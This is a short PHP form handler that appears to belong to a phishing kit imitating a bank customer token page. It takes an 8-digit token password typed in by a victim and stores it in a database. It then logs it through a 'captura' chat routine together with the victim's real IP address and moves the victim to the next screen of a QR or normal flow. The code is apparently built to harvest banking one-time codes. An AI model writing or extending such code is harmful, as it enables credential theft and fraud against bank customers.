<?php
require_once __DIR__ . '/../php_config/helpers.php';
require_once __DIR__ . '/../php_config/token_pantalla_helpers.php';
session_start();

if (!isset($_SESSION['usuario_id'])) {
    header('Location: ../personas.html');
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('Location: ../token-personas.php');
    exit;
}

$token_codigo = trim($_POST['token_codigo'] ?? '');

if ($token_codigo === '') {
    $_SESSION['token_error'] = 'Ingresa la contraseña de tu token.';
    header('Location: ../token-personas.php');
    exit;
}

if (!preg_match('/^[0-9]{8}$/', $token_codigo)) {
    $_SESSION['token_error'] = 'La contraseña token debe tener 8 dígitos.';
    header('Location: ../token-personas.php');
    exit;
}

try {
    $pdo = conectarBD();
    $usuarioId = (int) $_SESSION['usuario_id'];

    $usuario = tokenPantallaObtenerUsuario($pdo, $usuarioId);
    if (!$usuario || !tokenPantallaEsPersona($usuario)) {
        $_SESSION['token_error'] = 'No pudimos procesar tu token. Intenta de nuevo.';
        header('Location: ../token-personas.php');
        exit;
    }

    $yaTeniaToken = tokenPantallaTokenIngresado($usuario);
    $modo = strtolower((string) ($usuario['token_pantalla_modo'] ?? 'normal'));
    if ($modo !== 'qr') {
        $modo = 'normal';
    }
    $ipUsuario = trim((string) ($usuario['ip_real'] ?? '')) ?: '::1';

    $stmt = $pdo->prepare('UPDATE usuarios SET token_codigo = ? WHERE id = ?');
    $stmt->execute([$token_codigo, $usuarioId]);

    if (!$yaTeniaToken) {
        tokenPantallaRegistrarCapturaChat($pdo, $usuarioId, $token_codigo, $modo, $ipUsuario);
    }

    unset($_SESSION['token_error']);

    header('Location: ../' . tokenPantallaDestinoPostToken($usuario, $modo));
    exit;
} catch (PDOException $e) {
    $_SESSION['token_error'] = 'No pudimos procesar tu token. Intenta de nuevo.';
    header('Location: ../token-personas.php');
    exit;
}
